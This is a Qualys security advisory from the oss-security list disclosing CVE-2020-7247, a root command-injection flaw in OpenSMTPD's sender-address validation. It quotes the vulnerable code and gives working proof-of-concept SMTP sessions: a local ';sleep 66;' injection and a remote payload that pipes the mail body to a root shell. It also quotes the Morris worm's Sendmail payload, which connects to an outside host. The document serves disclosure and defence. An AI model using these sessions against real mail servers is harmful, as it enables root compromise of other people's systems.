 Date: Tue, 28 Jan 2020 23:15:20 +0000 From: Qualys Security Advisory To: "oss-security@...ts.openwall.com" Subject: LPE and RCE in OpenSMTPD (CVE-2020-7247) Qualys Security Advisory LPE and RCE in OpenSMTPD (CVE-2020-7247) ============================================================================== Contents ============================================================================== Summary Analysis Exploitation Acknowledgments ============================================================================== Summary ============================================================================== We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This vulnerability is exploitable since May 2018 (commit a8e222352f, "switch smtpd to new grammar") and allows an attacker to execute arbitrary shell commands, as root: - either locally, in OpenSMTPD's default configuration (which listens on the loopback interface and only accepts mail from localhost); - or locally and remotely, in OpenSMTPD's "uncommented" default configuration (which listens on all interfaces and accepts external mail). We developed a simple proof of concept and successfully tested it against OpenBSD 6.6 (the current release) and Debian testing (Bullseye); other versions and distributions may be exploitable. ============================================================================== Analysis ============================================================================== OpenSMTPD's smtp\_mailaddr() function is responsible for validating sender (MAIL FROM) and recipient (RCPT TO) mail addresses: ------------------------------------------------------------------------------ 2189 static int 2190 smtp\_mailaddr(struct mailaddr \*maddr, char \*line, int mailfrom, char \*\*args, 2191 const char \*domain) 2192 { .... 2218 if (!valid\_localpart(maddr->user) || 2219 !valid\_domainpart(maddr->domain)) { .... 2234 return (0); 2235 } 2236 2237 return (1); 2238 } ------------------------------------------------------------------------------ - it calls valid\_domainpart() to validate the domain name (after the @ sign) of a mail address -- this function only accepts IPv4 and IPv6 addresses, and alpha-numeric, '.', '-', and '\_' characters; - it calls valid\_localpart() to validate the local part (before the @ sign) of a mail address -- this function only accepts alpha-numeric, '.', and MAILADDR\_ALLOWED characters (a white list from RFC 5322): 71 #define MAILADDR\_ALLOWED "!#$%&'\*/?^\`{|}~+-=\_" Among the characters in MAILADDR\_ALLOWED, the ones that are also in MAILADDR\_ESCAPE are later transformed into ':' characters (escaped) by mda\_expand\_token(): 72 #define MAILADDR\_ESCAPE "!#$%&'\*?\`{|}~" smtp\_mailaddr()'s white-listing and mda\_expand\_token()'s escaping are fundamental to OpenSMTPD's security -- they prevent dangerous characters from reaching the shell that executes MDA commands (in mda\_unpriv()): execle("/bin/sh", "/bin/sh", "-c", mda\_command, (char \*)NULL, mda\_environ); Mail Delivery Agents (MDAs) are responsible for delivering mail to local recipients; for example, OpenSMTPD's default MDA method is "mbox", and the corresponding MDA command is (in parse.y): asprintf(&dispatcher->u.local.command, "/usr/libexec/mail.local -f %%{mbox.from} %%{user.username}"); where %{user.username} is the name of an existing local user (the local part of the recipient address), and %{mbox.from} is the sender address (which would be under the complete control of an attacker if it were not for smtp\_mailaddr()'s white-listing and mda\_expand\_token()'s escaping). Unfortunately, we discovered a vulnerability in smtp\_mailaddr() (CVE-2020-7247): ------------------------------------------------------------------------------ 2189 static int 2190 smtp\_mailaddr(struct mailaddr \*maddr, char \*line, int mailfrom, char \*\*args, 2191 const char \*domain) 2192 { .... 2218 if (!valid\_localpart(maddr->user) || 2219 !valid\_domainpart(maddr->domain)) { .... 2229 if (maddr->domain\[0\] == '\\0') { 2230 (void)strlcpy(maddr->domain, domain, 2231 sizeof(maddr->domain)); 2232 return (1); 2233 } 2234 return (0); 2235 } 2236 2237 return (1); 2238 } ------------------------------------------------------------------------------ If the local part of an address is invalid (line 2218) and if its domain name is empty (line 2229), then smtp\_mailaddr() adds the default domain automatically (line 2230) and returns 1 (line 2232), although it should return 0 because the local part of the address is invalid (for example, because it contains invalid characters). As a result, an attacker can pass dangerous characters that are not in MAILADDR\_ALLOWED and not in MAILADDR\_ESCAPE (';' and ' ' in particular) to the shell that executes the MDA command. For example, the following local SMTP session executes "sleep 66" as root, in OpenSMTPD's default configuration: ------------------------------------------------------------------------------ $ nc 127.0.0.1 25 220 obsd66.example.org ESMTP OpenSMTPD HELO professor.falken 250 obsd66.example.org Hello professor.falken \[127.0.0.1\], pleased to meet you MAIL FROM:<;sleep 66;> 250 2.0.0 Ok RCPT TO: 250 2.1.5 Destination address valid: Recipient ok DATA 354 Enter mail, end with "." on a line by itself How about a nice game of chess? . 250 2.0.0 e6330998 Message accepted for delivery QUIT 221 2.0.0 Bye ------------------------------------------------------------------------------ ============================================================================== Exploitation ============================================================================== Nevertheless, our ability to execute arbitrary shell commands through the local part of the sender address is rather limited: - although OpenSMTPD is less restrictive than RFC 5321, the maximum length of a local part should be 64 characters; - the characters in MAILADDR\_ESCAPE (for example, '$' and '|') are transformed into ':' characters. To overcome these limitations, we drew inspiration from the Morris worm ([https://spaf.cerias.purdue.edu/tech-reps/823.pdf](https://spaf.cerias.purdue.edu/tech-reps/823.pdf)), which exploited the DEBUG vulnerability in Sendmail by executing the body of a mail as a shell script: ------------------------------------------------------------------------------ debug mail from:  rcpt to: <"|sed -e '1,/^$/'d | /bin/sh ; exit 0"> data cd /usr/tmp cat > x14481910.c <<'EOF' \[text of vector program\] EOF cc -o x14481910 x14481910.c;x14481910 128.32.134.16 32341 8712440; rm -f x14481910 x14481910.c . quit ------------------------------------------------------------------------------ Indeed, the standard input of an MDA command is the mail itself: "sed" removes the headers (which were added automatically by the mail server) and "/bin/sh" executes the body. We cannot simply reuse this command (because we cannot use the '|' and '>' characters), but we can use "read" to remove N header lines (where N is greater than the number of header lines added by the mail server) and prepend a "NOP slide" of N comment lines to the body of our mail. For example, the following remote SMTP session executes the body of our mail, as root, in OpenSMTPD's "uncommented" default configuration: ------------------------------------------------------------------------------ $ nc 192.168.56.143 25 220 obsd66.example.org ESMTP OpenSMTPD HELO professor.falken 250 obsd66.example.org Hello professor.falken \[192.168.56.1\], pleased to meet you MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;> 250 2.0.0 Ok RCPT TO: 250 2.1.5 Destination address valid: Recipient ok DATA 354 Enter mail, end with "." on a line by itself #0 #1 #2 #3 #4 #5 #6 #7 #8 #9 #a #b #c #d for i in W O P R; do echo -n "($i) " && id || break done >> /root/x."\`id -u\`"."$$" . 250 2.0.0 4cdd24df Message accepted for delivery QUIT 221 2.0.0 Bye ------------------------------------------------------------------------------ ============================================================================== Acknowledgments ============================================================================== We thank the OpenBSD developers for their great work and their quick response. \[[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png](https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png)\]<[https://www.qualys.com/email-banner](https://www.qualys.com/email-banner)\> This message may contain confidential and privileged information.
